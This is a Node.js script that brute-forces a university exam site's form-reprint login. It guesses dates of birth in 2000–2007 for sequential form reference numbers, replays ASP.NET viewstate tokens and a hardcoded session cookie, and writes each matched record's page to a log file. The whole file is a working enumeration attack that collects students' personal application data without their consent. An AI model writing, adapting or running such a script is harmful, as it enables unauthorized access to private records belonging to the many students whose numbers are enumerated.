const cheerio = require('cheerio');
const fs = require('fs');
const { exec } = require('child_process');
const axios = require('axios');


const logFile = 'log.txt';
let fulfilled = false;

function log(message) {
    fs.appendFile(logFile, `${new Date()} - ${message}\n`, (err) => {
        if (err) {
            console.error(err);
        }
    });
}

function generateDaysOfMonth(month, year) {
    const daysInMonth = new Date(year, month, 0).getDate();
    const days = [];

    for (let day = 1; day <= daysInMonth; day++) {
        const dayString = day.toString().padStart(2, '0');
        days.push(dayString);
    }
    return days;
}

async function findOne(formNo, year, month, date) {
    let html = ""
    try {
        const response = await axios.get('https://exam.shekhauniexam.in/Reprint_Login.aspx', {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Sec-CH-UA': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
                'Sec-CH-UA-Mobile': '?1',
                'Sec-CH-UA-Platform': '"Android"',
                'Upgrade-Insecure-Requests': '1',
                Referer: 'https://exam.shekhauniexam.in/Reprint_Login.aspx',
                'Referrer-Policy': 'strict-origin-when-cross-origin'
            }
        });
        const htm = response.data;
        html = htm;
    } catch (error) {
        console.error("error  " + formNo + " year " + year + " month " + month + " date " + date);
        return findOne(formNo, year, month, date);
    }
    let $ = cheerio.load(html);
    let viewState = $('#__VIEWSTATE').val();
    let viewStateGenerator = $('#__VIEWSTATEGENERATOR').val();
    let eventValidation = $('#__EVENTVALIDATION').val();
    viewState = encodeURIComponent(viewState);
    viewStateGenerator = encodeURIComponent(viewStateGenerator);
    eventValidation = encodeURIComponent(eventValidation);
    try {
        const response = await axios.post('https://exam.shekhauniexam.in/Reprint_Login.aspx',
            `__VIEWSTATE=${viewState}&__VIEWSTATEGENERATOR=${viewStateGenerator}&__EVENTVALIDATION=${eventValidation}&ctl00%24ContentPlaceHolder1%24txtfrmrefno=${formNo}&ctl00%24ContentPlaceHolder1%24txtdob=${year}-${month}-${date}&ctl00%24ContentPlaceHolder1%24btnstatus=Check+Status`,
            {
                headers: {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'ax-age=0',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Priority': 'u=0, i',
                    'Sec-CH-UA': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
                    'Sec-CH-UA-Mobile': '?1',
                    'Sec-CH-UA-Platform': '"Android"',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'ame-origin',
                    'Sec-Fetch-User': '?1',
                    'Sec-GPC': '1',
                    'Upgrade-Insecure-Requests': '1',
                    'Cookie': 'ASP.NET_SessionId=vrugvbttiwmlj5ukxzg31035',
                    'Referer': 'https://exam.shekhauniexam.in/Reprint_Login.aspx',
                    'Referrer-Policy': 'trict-origin-when-cross-origin'
                }
            }
        );
        const resultt = response.data;
        html = resultt
    } catch (error) {
        console.error("error  " + formNo + " year " + year + " month " + month + " date " + date);
        return findOne(formNo, year, month, date);
    }
    $ = cheerio.load(html);
    const inputElement = $('#ContentPlaceHolder1_btnreprint');
    if (!inputElement.val()) {
        console.log("Not found  " + formNo + " year " + year + " month " + month + " date " + date)
        return false;
    }
    viewState = $('#__VIEWSTATE').val();
    viewStateGenerator = $('#__VIEWSTATEGENERATOR').val();
    eventValidation = $('#__EVENTVALIDATION').val();
    viewState = encodeURIComponent(viewState);
    viewStateGenerator = encodeURIComponent(viewStateGenerator);
    eventValidation = encodeURIComponent(eventValidation);
    try {
        const response = await fetch("https://exam.shekhauniexam.in/Reprint_Login.aspx", {
            headers: {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "priority": "u=0, i",
                "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Brave\";v=\"126\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "sec-gpc": "1",
                "upgrade-insecure-requests": "1",
                "cookie": "ASP.NET_SessionId=vrugvbttiwmlj5ukxzg31035",
                "Referer": "https://exam.shekhauniexam.in/Reprint_Login.aspx",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            body: `__VIEWSTATE=${viewState}&__VIEWSTATEGENERATOR=${viewStateGenerator}&__EVENTVALIDATION=${eventValidation}&ctl00%24ContentPlaceHolder1%24txtfrmrefno=&ctl00%24ContentPlaceHolder1%24txtdob=&ctl00%24ContentPlaceHolder1%24btnreprint=Reprint+Form`,
            method: "POST"
        });
        const body = await response.text();
        html = body;
    } catch (error) {
        console.error("error  " + formNo + " year " + year + " month " + month + " date " + date);
        return findOne(formNo, year, month, date);
    }
    log("found  " + formNo + " year " + year + " month " + month + " date " + date)
    log(html);
    return true;
}

async function findOneMonth(formNo, year, month) {
    const days = generateDaysOfMonth(month, year);
    let count = 0;
    async function currentDay(date, month, year) {
        if (count >= days.length - 1) {
            return;
        }
        let isTaskTrue = await findOne(formNo, year, month, date);
        if(isTaskTrue) {
            fulfilled = true;
        }
        return currentDay(days[++count], month, year);
    }
    await currentDay(days[count], month, year);
    return;
}

async function findOneYear(formNo, year) {
    const rollNumbersPart1 = Array.from({ length: 12 }, (_, i) => `${i + 1}`);
    await Promise.all(rollNumbersPart1.map(month => findOneMonth(formNo, year, month)));
    return;
}




let fn = 240382648;
let yy = 2000;

async function loop() {
    console.log("loop runned");
    if (fulfilled) {
        fn++;
        yy = 2000;
        fulfilled = false;
        loop();
    }
    else {
        await findOneYear(fn, yy);
        yy++;
        if(yy == 2008) {
            fn++;
            yy = 2000;
        }
        loop();
    }
}


// loop()


// findOneMonth(240382647,2005,4).then(()=> console.log(fulfilled));
